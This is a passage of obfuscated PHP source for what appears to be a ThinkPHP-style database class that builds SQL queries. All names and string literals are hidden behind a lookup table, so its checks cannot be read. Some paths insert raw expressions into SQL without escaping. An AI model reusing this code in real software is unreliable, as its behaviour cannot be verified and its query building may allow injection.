isset($¬ĞÈ­È[$ßç×æÄ[585]]) ? $¬ĞÈ­È[$ßç×æÄ[585]] : $ßç×æÄ[12], $ßç×æÄ[865] => isset($¬ĞÈ­È[$ßç×æÄ[961]]) ? $¬ĞÈ­È[$ßç×æÄ[961]] : $ßç×æÄ[12], $ßç×æÄ[862] => isset($¬ĞÈ­È[$ßç×æÄ[174]]) ? $¬ĞÈ­È[$ßç×æÄ[174]] : $ßç×æÄ[12], $ßç×æÄ[863] => isset($¬ĞÈ­È[$ßç×æÄ[175]]) ? $¬ĞÈ­È[$ßç×æÄ[175]] : $ßç×æÄ[12], $ßç×æÄ[21] => isset($¬ĞÈ­È[$ßç×æÄ[78]]) ? substr($¬ĞÈ­È[$ßç×æÄ[78]], 1) : $ßç×æÄ[12]); } else { preg_match($ßç×æÄ[962], trim($Œµ™ß­), $‡ÙãŒÖ‚); $ŸÃºØ£„ = array($ßç×æÄ[937] => $‡ÙãŒÖ‚[1], $ßç×æÄ[864] => $‡ÙãŒÖ‚[2], $ßç×æÄ[865] => $‡ÙãŒÖ‚[3], $ßç×æÄ[862] => $‡ÙãŒÖ‚[4], $ßç×æÄ[863] => $‡ÙãŒÖ‚[5], $ßç×æÄ[21] => $‡ÙãŒÖ‚[6]); } $ŸÃºØ£„[$ßç×æÄ[892]] = $ßç×æÄ[12]; return $ŸÃºØ£„; } protected function debug() { $ÖÃãúÁì =& $_SERVER[ì…™Î¶Ï]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $ÖÃãúÁì[963]; if (think_config($ÖÃãúÁì[964])) { think_status($ÖÃãúÁì[965]); think_trace($this->queryStr . $ÖÃãúÁì[966] . think_status($ÖÃãúÁì[24], $ÖÃãúÁì[965], 6) . $ÖÃãúÁì[967], $ÖÃãúÁì[12], $ÖÃãúÁì[968]); } } protected function parseLock($ÏÛ´·Ä = false) { $’®îšŠ  =& $_SERVER[ì…™Î¶Ï]; if (!$ÏÛ´·Ä) { return $’®îšŠ [12]; } if ($’®îšŠ [894] == $this->dbType) { return $’®îšŠ [969]; } return $’®îšŠ [970]; } protected function parseSet($ËìéĞâó) { $æ—¬ÄÜ =& $_SERVER[ì…™Î¶Ï]; foreach ($ËìéĞâó as $¶¡Í­˜• => $ŠŞß´Ÿ) { if (is_array($ŠŞß´Ÿ) && $æ—¬ÄÜ[292] == $ŠŞß´Ÿ[0]) { $ÇãÌ °ï[] = $this->parseKey($¶¡Í­˜•) . $æ—¬ÄÜ[860] . $ŠŞß´Ÿ[1]; } elseif (is_scalar($ŠŞß´Ÿ) || is_null($ŠŞß´Ÿ)) { $ÇãÌ °ï[] = $this->parseKey($¶¡Í­˜•) . $æ—¬ÄÜ[860] . $this->parseValue($ŠŞß´Ÿ); } } return $æ—¬ÄÜ[971] . implode($æ—¬ÄÜ[50], $ÇãÌ °ï); } protected function bindParam($ù”üÚ, $©½¥»ù¹) { $this->bind[$_SERVER[ì…™Î¶Ï][4] . $ù”üÚ] = $©½¥»ù¹; } protected function parseBind($èÓ×îÕÚ) { $èÓ×îÕÚ = array_merge($this->bind, $èÓ×îÕÚ); $this->bind = array(); return $èÓ×îÕÚ; } function parseKey(&$Š„Ï¤ä¼, $¬Ê·©÷ = true) { if ($¬Ê·©÷) { $Š„Ï¤ä¼ = $this->parseKeyCheck($Š„Ï¤ä¼); } return $Š„Ï¤ä¼; } function parseKeyCheck($–Óû»Ù“) { $—–îÛä =& $_SERVER[ì…™Î¶Ï]; $–Óû»Ù“ = trim($–Óû»Ù“); if (!preg_match($—–îÛä[972], $–Óû»Ù“)) { think_exception($—–îÛä[973] . $–Óû»Ù“); } return $–Óû»Ù“; } protected function parseValue($½«¼³«Õ) { $”ÊÊ‡§ğ =& $_SERVER[ì…™Î¶Ï]; if (is_string($½«¼³«Õ)) { $½«¼³«Õ = $”ÊÊ‡§ğ[933] . $this->escapeString($½«¼³«Õ) . $”ÊÊ‡§ğ[933]; } elseif (isset($½«¼³«Õ[0]) && is_string($½«¼³«Õ[0]) && strtolower($½«¼³«Õ[0]) == $”ÊÊ‡§ğ[292]) { $½«¼³«Õ = $this->escapeString($½«¼³«Õ[1]); } elseif (is_array($½«¼³«Õ)) { $½«¼³«Õ = array_map(array($this, $”ÊÊ‡§ğ[934]), $½«¼³«Õ); } elseif (is_bool($½«¼³«Õ)) { $½«¼³«Õ = $½«¼³«Õ ? $”ÊÊ‡§ğ[89] : $”ÊÊ‡§ğ[190]; } elseif (is_null($½«¼³«Õ)) { $½«¼³«Õ = $”ÊÊ‡§ğ[104]; } return $½«¼³«Õ; } protected function parseField($æàÇëÙš) { $û×„Œà‹ =& $_SERVER[ì…™Î¶Ï]; if (is_string($æàÇëÙš) && strpos($æàÇëÙš, $û×„Œà‹[50])) { $æàÇëÙš = explode($û×„Œà‹[50], $æàÇëÙš); } if (is_array($æàÇëÙš)) { $Ãú»ËÃ = array(); foreach ($æàÇëÙš as $Àòë˜ => $ˆ¿ŞùŸù) { if (!is_numeric($Àòë˜)) { $Ãú»ËÃ[] = $this->parseKey($Àòë˜, !1) . $û×„Œà‹[974] . $this->parseKey($ˆ¿ŞùŸù); } else { $Ãú»ËÃ[] = $this->parseKey($ˆ¿ŞùŸù); } } $”ÆâšòŠ = implode($û×„Œà‹[50], $Ãú»ËÃ); } elseif (is_string($æàÇëÙš) && !empty($æàÇëÙš)) { $”ÆâšòŠ = $æàÇëÙš; } else { $”ÆâšòŠ = $û×„Œà‹[181]; } return $”ÆâšòŠ; } protected function parseTable($Úùº©Æ™) { $ ²¤çğ =& $_SERVER[ì…™Î¶Ï]; if (is_array($Úùº©Æ™)) { $°’…ÒÃ¡ = array(); foreach ($Úùº©Æ™ as $øÕ—ª¸Ó => $”Õ‡šú¯) { if (!is_numeric($øÕ—ª¸Ó)) { $°’…ÒÃ¡[] = $this->parseKey($øÕ—ª¸Ó) . $ ²¤çğ[53] . $this->parseKey($”Õ‡šú¯); } else { $°’…ÒÃ¡[] = $this->parseKey($øÕ—ª¸Ó); } } $Úùº©Æ™ = $°’…ÒÃ¡; } elseif (is_string($Úùº©Æ™)) { if (strstr($Úùº©Æ™, $ ²¤çğ[53])) { return $Úùº©Æ™; } $Úùº©Æ™ = explode($ ²¤çğ[50], $Úùº©Æ™); array_walk($Úùº©Æ™, array($this, $ ²¤çğ[882])); } return $ ²¤çğ[876] . trim(implode($ ²¤çğ[975], $Úùº©Æ™), $ ²¤çğ[380]) . $ ²¤çğ[876]; } protected function parseWhere($–á”Ñ¢¹) { $ë€€â•Ÿ =& $_SERVER[ì…™Î¶Ï]; $Â¼û±øî = $ë€€â•Ÿ[12]; if (is_string($–á”Ñ¢¹)) { $Â¼û±øî = $–á”Ñ¢¹; } else { $ ğ“ÙÀ = isset($–á”Ñ¢¹[$ë€€â•Ÿ[976]]) ? strtoupper($–á”Ñ¢¹[$ë€€â•Ÿ[976]]) : $ë€€â•Ÿ[12]; if (in_array($ ğ“ÙÀ, array($ë€€â•Ÿ[977], $ë€€â•Ÿ[978], $ë€€â•Ÿ[979]))) { $ ğ“ÙÀ = $ë€€â•Ÿ[53] . $ ğ“ÙÀ . $ë€€â•Ÿ[53]; unset($–á”Ñ¢¹[$ë€€â•Ÿ[976]]); } else { $ ğ“ÙÀ = $ë€€â•Ÿ[980]; } foreach ($–á”Ñ¢¹ as $ÑÁÃìæÕ => $ñÚ’±°) { $Â¼û±øî .= $ë€€â•Ÿ[272]; if (is_numeric($ÑÁÃìæÕ)) { $ÑÁÃìæÕ = $ë€€â•Ÿ[981]; } if (0 === strpos($ÑÁÃìæÕ, $ë€€â•Ÿ[11])) { $Â¼û±øî .= $this->parseThinkWhere($ÑÁÃìæÕ, $ñÚ’±°); } else { if (!preg_match($ë€€â•Ÿ[982], trim($ÑÁÃìæÕ))) { think_exception(think_lang($ë€€â•Ÿ[983]) . $ë€€â•Ÿ[4] . $ÑÁÃìæÕ); } $®òÑ¨¶ = is_array($ñÚ’±°) && isset($ñÚ’±°[$ë€€â•Ÿ[984]]); $ÑÁÃìæÕ = trim($ÑÁÃìæÕ); if (strpos($ÑÁÃìæÕ, $ë€€â•Ÿ[278])) { $ô¤€ü±„ = explode($ë€€â•Ÿ[278], $ÑÁÃìæÕ); $ÔËõÏ¢ş = array(); foreach ($ô¤€ü±„ as $×Æ¸“ßŠ => $ü¨öŸĞõ) { $ÈÃçæ—Ò = $®òÑ¨¶ ? $ñÚ’±°[$×Æ¸“ßŠ] : $ñÚ’±°; $ÔËõÏ¢ş[] = $ë€€â•Ÿ[255] . $this->parseWhereItem($this->parseKey($ü¨öŸĞõ), $ÈÃçæ—Ò) . $ë€€â•Ÿ[881]; } $Â¼û±øî .= implode($ë€€â•Ÿ[985], $ÔËõÏ¢ş); } elseif (strpos($ÑÁÃìæÕ, $ë€€â•Ÿ[279])) { $ô¤€ü±„ = explode($ë€€â•Ÿ[279], $ÑÁÃìæÕ); $ÔËõÏ¢ş = array(); foreach ($ô¤€ü±„ as $×Æ¸“ßŠ => $ü¨öŸĞõ) { $ÈÃçæ—Ò = $®òÑ¨¶ ? $ñÚ’±°[$×Æ¸“ßŠ] : $ñÚ’±°; $ÔËõÏ¢ş[] = $ë€€â•Ÿ[255] . $this->parseWhereItem($this->parseKey($ü¨öŸĞõ), $ÈÃçæ—Ò) . $ë€€â•Ÿ[881]; } $Â¼û±øî .= implode($ë€€â•Ÿ[980], $ÔËõÏ¢ş); } else { $Â¼û±øî .= $this->parseWhereItem($this->parseKey($ÑÁÃìæÕ), $ñÚ’±°); } } $Â¼û±øî .= $ë€€â•Ÿ[273] . $ ğ“ÙÀ; } $Â¼û±øî = substr($Â¼û±øî, 0, -strlen($ ğ“ÙÀ)); } return empty($Â¼û±øî) ? $ë€€â•Ÿ[12] : $ë€€â•Ÿ[986] . $Â¼û±øî; } protected function parseWhereItem($Ë…­´“Ñ, $ÚÌÍ‘°•) { $äê˜€ÎÚ =& $_SERVER[ì…™Î¶Ï]; $¶‘½Ê¦µ = $äê˜€ÎÚ[12]; if (is_array($ÚÌÍ‘°•)) { if (is_string($ÚÌÍ‘°•[0])) { $¥¥æš”´ = strtolower($ÚÌÍ‘°•[0]); if (in_array($ÚÌÍ‘°•[0], array($äê˜€ÎÚ[860], $äê˜€ÎÚ[987], $äê˜€ÎÚ[988], $äê˜€ÎÚ[989], $äê˜€ÎÚ[990], $äê˜€ÎÚ[991]))) { $¶‘½Ê¦µ .= $Ë…­´“Ñ . $äê˜€ÎÚ[53] . $ÚÌÍ‘°•[0] . $äê˜€ÎÚ[53] . $this->parseValue($ÚÌÍ‘°•[1]); } elseif (preg_match($äê˜€ÎÚ[992], $ÚÌÍ‘°•[0])) { $¶‘½Ê¦µ .= $Ë…­´“Ñ . $äê˜€ÎÚ[53] . $this->exp[$¥¥æš”´] . $äê˜€ÎÚ[53] . $this->parseValue($ÚÌÍ‘°•[1]); } elseif (preg_match($äê˜€ÎÚ[993], $ÚÌÍ‘°•[0])) { if (is_array($ÚÌÍ‘°•[1])) { $¦ğÄâû‹ = isset($ÚÌÍ‘°•[2]) ? strtoupper($ÚÌÍ‘°•[2]) : $äê˜€ÎÚ[978]; if (in_array($¦ğÄâû‹, array($äê˜€ÎÚ[977], $äê˜€ÎÚ[978], $äê˜€ÎÚ[979]))) { $º–ä»É = array(); foreach ($ÚÌÍ‘°•[1] as $–ûÁ­Û) { $º–ä»É[] = $Ë…­´“Ñ . $äê˜€ÎÚ[53] . $this->exp[$¥¥æš”´] . $äê˜€ÎÚ[53] . $this->parseValue($–ûÁ­Û); } $¶‘½Ê¦µ .= $äê˜€ÎÚ[255] . implode($äê˜€ÎÚ[53] . $¦ğÄâû‹ . $äê˜€ÎÚ[53], $º–ä»É) . $äê˜€ÎÚ[881]; } } else { $¶‘½Ê¦µ .= $Ë…­´“Ñ . $äê˜€ÎÚ[53] . $this->exp[$¥¥æš”´] . $äê˜€ÎÚ[53] . $this->parseValue($ÚÌÍ‘°•[1]); } } elseif ($äê˜€ÎÚ[292] == $¥¥æš”´) { $¶‘½Ê¦µ .= $äê˜€ÎÚ[879] . $Ë…­´“Ñ . $äê˜€ÎÚ[53] . $ÚÌÍ‘°•[1] . $äê˜€ÎÚ[994]; } elseif (preg_match($äê˜€ÎÚ[995], $ÚÌÍ‘°•[0])) { $¶‘½Ê¦µ .= $ÚÌÍ‘°•[0]; } elseif (preg_match($äê˜€ÎÚ[996], $ÚÌÍ‘°•[0])) { if (isset($ÚÌÍ‘°•[2]) && $äê˜€ÎÚ[292] == $ÚÌÍ‘°•[2]) { $¶‘½Ê¦µ .= $Ë…­´“Ñ . $äê˜€ÎÚ[53] . $this->exp[$¥¥æš”´] . $äê˜€ÎÚ[53] . $ÚÌÍ‘°•[1]; } else { if (is_string($ÚÌÍ‘°•[1])) { $ÚÌÍ‘°•[1] = explode($äê˜€ÎÚ[50], $ÚÌÍ‘°•[1]); } $À…»¹´ç = implode($äê˜€ÎÚ[50], $this->parseValue($ÚÌÍ‘°•[1])); $¶‘½Ê¦µ .= $Ë…­´“Ñ . $äê˜€ÎÚ[53] . $this->exp[$¥¥æš”´] . $äê˜€ÎÚ[879] . $À…»¹´ç . $äê˜€ÎÚ[881]; } } elseif (preg_match($äê˜€ÎÚ[997], $ÚÌÍ‘°•[0])) { $¥ºÑÈØ = is_string($ÚÌÍ‘°•[1]) ? explode($äê˜€ÎÚ[50], $ÚÌÍ‘°•[1]) : $ÚÌÍ‘°•[1]; $¶‘½Ê¦µ .= $äê˜€ÎÚ[879] . $Ë…­´“Ñ . $äê˜€ÎÚ[53] . $this->exp[$¥¥æš”´] . $äê˜€ÎÚ[53] . $this->parseValue($¥ºÑÈØ[0]) . $äê˜€ÎÚ[980] . $this->parseValue($¥ºÑÈØ[1]) . $äê˜€ÎÚ[273]; } else { think_exception(think_lang($äê˜€ÎÚ[983]) . $äê˜€ÎÚ[4] . $ÚÌÍ‘°•[0]); } } else { $»ıİá…æ = count($ÚÌÍ‘°•); $˜Õó¬¬Ù = $äê˜€ÎÚ[12]; if (is_string($ÚÌÍ‘°•[$»ıİá…æ - 1])) { $˜Õó¬¬Ù = isset($ÚÌÍ‘°•[$»ıİá…æ - 1]) ? strtoupper($ÚÌÍ‘°•[$»ıİá…æ - 1]) : $äê˜€ÎÚ[12]; if (in_array($˜Õó¬¬Ù, array($äê˜€ÎÚ[977], $äê˜€ÎÚ[978], $äê˜€ÎÚ[979]))) { $»ıİá…æ = $»ıİá…æ - 1; } } else { $˜Õó¬¬Ù = $äê˜€ÎÚ[977]; } for ($©¸õÌœâ = 0; $©¸õÌœâ < $»ıİá…æ; $©¸õÌœâ++) { $¥ºÑÈØ = is_array($ÚÌÍ‘°•[$©¸õÌœâ]) ? $ÚÌÍ‘°•[$©¸õÌœâ][1] : $ÚÌÍ‘°•[$©¸õÌœâ]; if ($äê˜€ÎÚ[292] == strtolower($ÚÌÍ‘°•[$©¸õÌœâ][0])) { $¶‘½Ê¦µ .= $äê˜€ÎÚ[255] . $Ë…­´“Ñ . $äê˜€ÎÚ[53] . $¥ºÑÈØ . $äê˜€ÎÚ[994] . $˜Õó¬¬Ù . $äê˜€ÎÚ[53]; } else { $Š·¸ãí = is_array($ÚÌÍ‘°•[$©¸õÌœâ]) ? $this->exp[strtolower($ÚÌÍ‘°•[$©¸õÌœâ][0])] : $äê˜€ÎÚ[860]; if (!$Š·¸ãí && is_array($ÚÌÍ‘°•[$©¸õÌœâ]) && in_array($ÚÌÍ‘°•[$©¸õÌœâ][0], array($äê˜€ÎÚ[860], $äê˜€ÎÚ[987], $äê˜€ÎÚ[988], $äê˜€ÎÚ[989], $äê˜€ÎÚ[990], $äê˜€ÎÚ[991]))) { $Š·¸ãí = $ÚÌÍ‘°•[$©¸õÌœâ][0]; } $¶‘½Ê¦µ .= $äê˜€ÎÚ[255] . $Ë…­´“Ñ . $äê˜€ÎÚ[53] . $Š·¸ãí . $äê˜€ÎÚ[53] . $this->parseValue($¥ºÑÈØ) . $äê˜€ÎÚ[994] . $˜Õó¬¬Ù . $äê˜€ÎÚ[53]; } } $¶‘½Ê¦µ = substr($¶‘½Ê¦µ, 0, -4); } } else { $¶‘½Ê¦µ .= $Ë…­´“Ñ . $äê˜€ÎÚ[998] . $this->parseValue($ÚÌÍ‘°•); } return $¶‘½Ê¦µ; } protected function parseThinkWhere($ö—É­Ğ³, $Úê¤Çı‡) { $‰ËÛãŸœ =& $_SERVER[ì…™Î¶Ï]; $”–§áÓØ = $‰ËÛãŸœ[12]; switch ($ö—É­Ğ³) { case $‰ËÛãŸœ[347]: $”–§áÓØ = $Úê¤Çı‡; break; case $‰ËÛãŸœ[981]: $”–§áÓØ = is_string($Úê¤Çı‡) ? $Úê¤Çı‡ : substr($this->parseWhere($Úê¤Çı‡), 6); break; case $‰ËÛãŸœ[999]: parse_str($Úê¤Çı‡, $¹ŒŸÖÇ); if (isset($¹ŒŸÖÇ[$‰ËÛãŸœ[976]])) { $×âñ†¨ = $‰ËÛãŸœ[53] . strtoupper($¹ŒŸÖÇ[$‰ËÛãŸœ[976]]) . $‰ËÛãŸœ[53]; unset($¹ŒŸÖÇ[$‰ËÛãŸœ[976]]); } else { $×âñ†¨ = $‰ËÛãŸœ[980]; } $¥ñøıô¿ = array(); foreach ($¹ŒŸÖÇ as $¸èìÊóÆ => $á¨ßËÖ) { $¥ñøıô¿[] = $this->parseKey($¸èìÊóÆ) . $‰ËÛãŸœ[998] . $this->parseValue($á¨ßËÖ); } $”–§áÓØ = implode($×âñ†¨, $¥ñøıô¿); break; } return $”–§áÓØ; } protected function parseLimit($×ùèÆÖ‘) { $ó­ù¨ƒ· =& $_SERVER[ì…™Î¶Ï]; return !empty($×ùèÆÖ‘) ? $ó­ù¨ƒ·[51] . $×ùèÆÖ‘ . $ó­ù¨ƒ·[53] : $ó­ù¨ƒ·[12]; } protected function parseJoin($¬¥ï™©µ) { $Èµëşœ® =& $_SERVER[ì…™Î¶Ï]; $‚®ÓÖË¿ = $Èµëşœ®[12]; if (!empty($¬¥ï™©µ)) { if (is_array($¬¥ï™©µ)) { foreach ($¬¥ï™©µ as $ºöˆÃçï => $Œš²á˜ƒ) { if (!1 !== stripos($Œš²á˜ƒ, $Èµëşœ®[1000])) { $‚®ÓÖË¿ .= $Èµëşœ®[53] . $Œš²á˜ƒ; } else { $‚®ÓÖË¿ .= $Èµëşœ®[1001] . $Œš²á˜ƒ; } } } else { $‚®ÓÖË¿ .= $Èµëşœ®[1001] . $¬¥ï™©µ; } } $‚®ÓÖË¿ = preg_replace($Èµëşœ®[1002], think_config($Èµëşœ®[906]) . $Èµëşœ®[1003], $‚®ÓÖË¿); return $‚®ÓÖË¿; } protected function parseOrder($ÖˆêøÉ) { $Ü÷¾Óåš =& $_SERVER[ì…™Î¶Ï]; if (is_array($ÖˆêøÉ)) { $³¤îğ°ı = array(); foreach ($ÖˆêøÉ as $ÕÏ³’õú => $¹©ãÒüê) { if (is_numeric($ÕÏ³’õú)) { $³¤îğ°ı[] = $this->parseKey($¹©ãÒüê); } else { $¹©ãÒüê = in_array(strtoupper(trim($¹©ãÒüê)), array($Ü÷¾Óåš[1004], $Ü÷¾Óåš[1005])) ? $Ü÷¾Óåš[53] . $¹©ãÒüê : $Ü÷¾Óåš[12]; if (preg_match($Ü÷¾Óåš[1006], $ÕÏ³’õú)) { $³¤îğ°ı[] = $this->parseKey($ÕÏ³’õú) . $¹©ãÒüê; } else { think_exception($Ü÷¾Óåš[1007] . $ÕÏ³’õú); } } } $ÖˆêøÉ = implode($Ü÷¾Óåš[50], $³¤îğ°ı); } return !empty($ÖˆêøÉ) ? $Ü÷¾Óåš[1008] . $ÖˆêøÉ : $Ü÷¾Óåš[12]; } protected function parseGroup($ìúÍ·ëƒ) { $‡Ûıç÷£ =& $_SERVER[ì…™Î¶Ï]; return !empty($ìúÍ·ëƒ) ? $‡Ûıç÷£[1009] . $ìúÍ·ëƒ : $‡Ûıç÷£[12]; } protected function parseHaving($ ÒŠßÅ†) { $µ˜Şù¶ =& $_SERVER[ì…™Î¶Ï]; return !empty($ ÒŠßÅ†) ? $µ˜Şù¶[1010] . $ ÒŠßÅ† : $µ˜Şù¶[12]; } protected function parseComment($šà×ù¥í) { $šø¯´Úë =& $_SERVER[ì…™Î¶Ï]; return !empty($šà×ù¥í) ? $šø¯´Úë[1011] . $šà×ù¥í . $šø¯´Úë[1012] : $šø¯´Úë[12]; } protected function parseDistinct($­ÌşÜÍà) { $ĞÂ±»³ =& $_SERVER[ì…™Î¶Ï]; return !empty($­ÌşÜÍà) ? $ĞÂ±»³[1013] : $ĞÂ±»³[12]; } protected function parseUnion($­øİ£ƒâ) { $áÑõŸ‹Ï =& $_SERVER[ì…™Î¶Ï]; if (empty($­øİ£ƒâ)) { return $áÑõŸ‹Ï[12]; } if (isset($­øİ£ƒâ[$áÑõŸ‹Ï[343]])) { $ØËÑ±‹ = $áÑõŸ‹Ï[1014]; unset($­øİ£ƒâ[$áÑõŸ‹Ï[343]]); } else { $ØËÑ±‹ = $áÑõŸ‹Ï[1015]; } foreach ($­øİ£ƒâ as $ ßÕ¿ú) { $Ü—–ü…¦[] = $ØËÑ±‹ . (is_array($ ßÕ¿ú) ? $this->buildSelectSql($ ßÕ¿ú) : $ ßÕ¿ú); } return implode($áÑõŸ‹Ï[53], $Ü—–ü…¦); } public function insert($Ÿşãöú, $Ë¦ôÀÑì = array(), $¨ààµ„  = false) { $‘ÑÁÅŒÔ =& $_SERVER[ì…™Î¶Ï]; $áÉ¹ã¨Á = $•ŒŠ¢íµ = array(); $this->model = $Ë¦ôÀÑì[$‘ÑÁÅŒÔ[276]]; foreach ($Ÿşãöú as $‚Ğ®û¡Û => $Úªœ·Üå) { if (is_array($Úªœ·Üå) && $‘ÑÁÅŒÔ[292] == $Úªœ·Üå[0]) { $•ŒŠ¢íµ[] = $this->parseKey($‚Ğ®û¡Û); $áÉ¹ã¨Á[] = $Úªœ·Üå[1]; } elseif (is_scalar($Úªœ·Üå) || is_null($Úªœ·Üå)) { $•ŒŠ¢íµ[] = $this->parseKey($‚Ğ®û¡Û); $áÉ¹ã¨Á[] = $this->parseValue($Úªœ·Üå); } } $˜úÆ›æ = ($¨ààµ„  ? $‘ÑÁÅŒÔ[883] : $‘ÑÁÅŒÔ[884]) . $‘ÑÁÅŒÔ[885] . $this->parseTable($Ë¦ôÀÑì[$‘ÑÁÅŒÔ[274]]) . $‘ÑÁÅŒÔ[879] . implode($‘ÑÁÅŒÔ[50], $•ŒŠ¢íµ) . $‘ÑÁÅŒÔ[880] . implode($‘ÑÁÅŒÔ[50], $áÉ¹ã¨Á) . $‘ÑÁÅŒÔ[881]; $˜úÆ›æ .= $this->parseLock(isset($Ë¦ôÀÑì[$‘ÑÁÅŒÔ[818]]) ? $Ë¦ôÀÑì[$‘ÑÁÅŒÔ[818]] : !1); $˜úÆ›æ .= $this->parseComment(!empty($Ë¦ôÀÑì[$‘ÑÁÅŒÔ[349]]) ? $Ë¦ôÀÑì[$‘ÑÁÅŒÔ[349]] : $‘ÑÁÅŒÔ[12]); return $this->execute($˜úÆ›æ, $this->parseBind(!empty($Ë¦ôÀÑì[$‘ÑÁÅŒÔ[280]]) ? $Ë¦ôÀÑì[$‘ÑÁÅŒÔ[280]] : array())); } public function selectInsert($ı¯Üúë”, $¯İØÑÎº, $ĞÛÄÌæ¿ = array()) { $Ï›²€Ë =& $_SERVER[ì…™Î¶Ï]; $this->model = $ĞÛÄÌæ¿[$Ï›²€Ë[276]]; if (is_string($ı¯Üúë”)) { $ı¯Üúë” = explode($Ï›²€Ë[50], $ı¯Üúë”); } array_walk($ı¯Üúë”, array($this, $Ï›²€Ë[882])); $¬ûœŸöå = $Ï›²€Ë[1016] . $this->parseTable($¯İØÑÎº) . $Ï›²€Ë[879] . implode($Ï›²€Ë[50], $ı¯Üúë”) . $Ï›²€Ë[994]; $¬ûœŸöå .= $this->buildSelectSql($ĞÛÄÌæ¿); return $this->execute($¬ûœŸöå, $this->parseBind(!empty($ĞÛÄÌæ¿[$Ï›²€Ë[280]]) ? $ĞÛÄÌæ¿[$Ï›²€Ë[280]] : array())); } public function update($È¹úÇ¡Ñ, $„ß¿ŸËÕ) { $òı˜´Á¹ =& $_SERVER[ì…™Î¶Ï]; $this->model = $„ß¿ŸËÕ[$òı˜´Á¹[276]]; $¨Âğ–Ó‘ = $òı˜´Á¹[1017] . $this->parseTable($„ß¿ŸËÕ[$òı˜´Á¹[274]]) . $this->parseSet($È¹úÇ¡Ñ) . $this->parseWhere(!empty($„ß¿ŸËÕ[$òı˜´Á¹[270]]) ? $„ß¿ŸËÕ[$òı˜´Á¹[270]] : $òı˜´Á¹[12]) . $this->parseOrder(!empty($„ß¿ŸËÕ[$òı˜´Á¹[360]]) ? $„ß¿ŸËÕ[$òı˜´Á¹[360]] : $òı˜´Á¹[12]) . $this->parseLimit(!empty($„ß¿ŸËÕ[$òı˜´Á¹[287]]) ? $„ß¿ŸËÕ[$òı˜´Á¹[287]] : $òı˜´Á¹[12]) . $this->parseLock(isset($„ß¿ŸËÕ[$òı˜´Á¹[818]]) ? $„ß¿ŸËÕ[$òı˜´Á¹[818]] : !1) . $this->parseComment(!empty($„ß¿ŸËÕ[$òı˜´Á¹[349]]) ? $„ß¿ŸËÕ[$òı˜´Á¹[349]] : $òı˜´Á¹[12]); return $this->execute($¨Âğ–Ó‘, $this->parseBind(!empty($„ß¿ŸËÕ[$òı˜´Á¹[280]]) ? $„ß¿ŸËÕ[$òı˜´Á¹[280]] : array())); } public function delete($Á‘Ãõ÷Ş = array()) { $­¶ÛÂÌÄ =& $_SERVER[ì…™Î¶Ï]; $this->model = $Á‘Ãõ÷Ş[$­¶ÛÂÌÄ[276]]; $Üµ•¯î» = $­¶ÛÂÌÄ[1018] . $this->parseTable($Á‘Ãõ÷Ş[$­¶ÛÂÌÄ[274]]) . $this->parseWhere(!empty($Á‘Ãõ÷Ş[$­¶ÛÂÌÄ[270]]) ? $Á‘Ãõ÷Ş[$­¶ÛÂÌÄ[270]] : $­¶ÛÂÌÄ[12]) . $this->parseOrder(!empty($Á‘Ãõ÷Ş[$­¶ÛÂÌÄ[360]]) ? $Á‘Ãõ÷Ş[$­¶ÛÂÌÄ[360]] : $­¶ÛÂÌÄ[12]) . $this->parseLimit(!empty($Á‘Ãõ÷Ş[$­¶ÛÂÌÄ[287]]) ? $Á‘Ãõ÷Ş[$­¶ÛÂÌÄ[287]] : $­¶ÛÂÌÄ[12]) . $this->parseLock(isset($Á‘Ãõ÷Ş[$­¶ÛÂÌÄ[818]]) ? $Á‘Ãõ÷Ş[$­¶ÛÂÌÄ[818]] : !1) . $this->parseComment(!empty($Á‘Ãõ÷Ş[$­¶ÛÂÌÄ[349]]) ? $Á‘Ãõ÷Ş[$­¶ÛÂÌÄ[349]] : $­¶ÛÂÌÄ[12]); return $this->execute($Üµ•¯î», $this->parseBind(!empty($Á‘Ãõ÷Ş[$­¶ÛÂÌÄ[280]]) ? $Á‘Ãõ÷Ş[$­¶ÛÂÌÄ[280]] : array())); } public function select($”ªøÊ¼ş = array()) { $ŠÂç¸’» =& $_SERVER[ì…™Î¶Ï]; $this->model = $”ªøÊ¼ş[$ŠÂç¸’»[276]]; $ÆÙ–²õï = $this->buildSelectSql($”ªøÊ¼ş); $ëöˆô– = isset($”ªøÊ¼ş[$ŠÂç¸’»[344]]) ? $”ªøÊ¼ş[$ŠÂç¸’»[344]] : !1; if ($ëöˆô–) { $Õ×Ô¢÷Ó = is_string($ëöˆô–[$ŠÂç¸’»[95]]) ? $ëöˆô–[$ŠÂç¸’»[95]] : $ŠÂç¸’»[1019] . md5($ÆÙ–²õï); $¥®…‡’ = think_cache($Õ×Ô¢÷Ó, $ŠÂç¸’»[12], $ëöˆô–); if (!1 !== $¥®…‡’) { return $¥®…‡’; } } $€ä´’³« = $this->query($ÆÙ–²õï, $this->parseBind(!empty($”ªøÊ¼ş[$ŠÂç¸’»[280]]) ? $”ªøÊ¼ş[$ŠÂç¸’»[280]] : array())); if ($ëöˆô– && !1 !== $€ä´’³«) { think_cache($Õ×Ô¢÷Ó, $€ä´’³«, $ëöˆô–); } return $€ä´’³«; } public function buildSelectSql($øŒØò™ô = array()) { $öŸ¤Ù”è =& $_SERVER[ì…™Î¶Ï]; if (isset($øŒØò™ô[$öŸ¤Ù”è[348]])) { if (strpos($øŒØò™ô[$öŸ¤Ù”è[348]], $öŸ¤Ù”è[50])) { list($Ò¸«”¬œ, $‰ãÏÙÍô) = explode($öŸ¤Ù”è[50], $øŒØò™ô[$öŸ¤Ù”è[348]]); } else { $Ò¸«”¬œ = $øŒØò™ô[$öŸ¤Ù”è[348]]; } $Ò¸«”¬œ = $Ò¸«”¬œ ? $Ò¸«”¬œ : 1; $‰ãÏÙÍô = isset($‰ãÏÙÍô) ? $‰ãÏÙÍô : (is_numeric($øŒØò™ô[$öŸ¤Ù”è[287]]) ? $øŒØò™ô[$öŸ¤Ù”è[287]] : 20); $şˆø·Ø = $‰ãÏÙÍô * ((int) $Ò¸«”¬œ - 1); $øŒØò™ô[$öŸ¤Ù”è[287]] = $şˆø·Ø . $öŸ¤Ù”è[50] . $‰ãÏÙÍô; } if (think_config($öŸ¤Ù”è[1020])) { $†òñ‡áŠ = $öŸ¤Ù”è[1021] . md5(serialize($øŒØò™ô)); $¹µÇ¾¡„ = think_cache($†òñ‡áŠ); if ($¹µÇ¾¡„) { return $¹µÇ¾¡„; } } $òÚßÀ¦· = $this->parseSql($this->selectSql, $øŒØò™ô); $òÚßÀ¦· .= $this->parseLock(isset($øŒØò™ô[$öŸ¤Ù”è[818]]) ? $øŒØò™ô[$öŸ¤Ù”è[818]] : !1); if 